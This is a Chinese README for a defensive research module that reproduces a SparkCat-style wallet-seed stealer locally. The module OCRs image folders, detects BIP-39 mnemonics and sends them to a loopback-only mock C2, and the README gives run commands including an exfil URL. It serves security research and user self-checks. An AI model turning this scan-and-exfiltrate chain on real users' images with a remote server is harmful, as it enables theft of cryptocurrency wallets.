# 案例三:助记词扫描木马复现(`mnestic/`)

> 复现 **SparkCat 类助记词木马**的核心环节:扫描本地图片 → OCR → 检出 BIP-39 助记词 →
> 回传 C2。调研依据见 [`docs/research/mnemonic-stealer.md`](../docs/research/mnemonic-stealer.md)(Issue #80)。

> **免责声明 / 红线**:仅用于防御研究与安全意识教育。
> 一切实践仅限**本机(Ubuntu)实验**;C2 模拟器 **fail-closed 只绑 127.0.0.1**,
> `--c2` 回传目标同样**硬性校验必须为回环地址**(非回环直接拒绝),零外联;
> 不做免杀/持久化/进程隐藏;**不修改、不移动、不删除被扫描目录的任何文件**;
> 示例助记词全部来自 BIP-39 官方测试向量,不含真实资产。

## 复现了什么

真实木马(SparkCat/SparkKitty)的作案前提是:**大量用户把助记词截图存在相册里**。
木马拿到相册权限后逐图 OCR,命中 2048 词的 BIP-39 词表序列即窃取——拿到助记词等于
拿到钱包完全控制权。本模块在本机复现这条链路:

| 环节 | 真实木马 | 本复现 |
|---|---|---|
| 图片来源 | 相册(相册权限) | 本地任意目录(`scan` 参数) |
| OCR | Google ML Kit(本地) | tesseract CLI(本地) |
| 检出 | 词表匹配 | BIP-39 词表匹配 + **校验和验证**(超出真实木马:可判定"真助记词"vs"词表词巧合") |
| 回传 | 攻击者 C2 服务器 | `127.0.0.1` 本地 HTTP 服务(`c2` 子命令) |
| 记录 | 攻击者数据库 | 本地 sqlite 审计库(与案例一 clipper 同风格) |

## 快速开始

```bash
# 依赖:uv sync;Ubuntu 需要 tesseract:
sudo apt-get install -y tesseract-ocr tesseract-ocr-eng

# 1. 启动本地 C2 模拟器(仅绑 127.0.0.1,终端 A)
uv run mnestic c2 --port 8765

# 2. 扫描目录并回传(终端 B)——把含助记词截图的目录换进去
uv run mnestic scan ~/Pictures --c2 http://127.0.0.1:8765/exfil

# 只看不回传 / 脱敏输出:
uv run mnestic scan ~/Pictures --mask
```

检出结果同时写入 `~/.local/share/mnestic/findings.db`(scan 端)与
`~/.local/share/mnestic/c2.db`(C2 端),可用 sqlite3 查看。

退出码:`scan` 检出**校验和自洽**的助记词时返回 1——可用作脚本化的"本机是否有
助记词截图"自检(这正是后续防御工具的方向:把木马的 OCR 能力反转为用户侧体检)。

## 目录结构

| 文件 | 职责 |
|---|---|
| `detect/detector.py` | BIP-39 词表匹配(滑动窗口)+ SHA-256 校验和验证;`MnemonicHit.masked()` 脱敏 |
| `detect/wordlist_en.txt` | BIP-39 官方英文词表(2048 词,bitcoin/bips 上游) |
| `ocr.py` | tesseract 子进程封装:灰度 + 3x 放大预处理;缺失时抛 `OcrUnavailable` 不静默 |
| `scan.py` | 目录递归 → OCR → 检出 → sqlite 审计;`ocr_fn` 可注入(L2 测试不依赖 tesseract) |
| `c2.py` | 本地 C2 模拟器(http.server,仅回环)+ `exfiltrate()` 回传客户端 |
| `cli.py` | `mnestic scan <dir> [--c2 URL] [--mask]` / `mnestic c2 [--port]` |

## 防御视角

复现的价值在反面:**不要把助记词截图存进相册/本机**。任何拿到图片读取权限的 App
(哪怕看起来正经)都能像本模块一样在几秒内"体检"出你的钱包。对应检测/防御点:

1. **自检**:定期 `mnestic scan` 自己的图片目录(退出码可脚本化),先把已泄露的找出来;
2. **告警扩展**(规划):案例一 clipper 的检出闸门扩展识别剪贴板中的 BIP-39 序列——
   Efimer 正是从剪贴板偷助记词的;
3. **根上防**:助记词只手写/刻钢板离线保存,永不数字化。
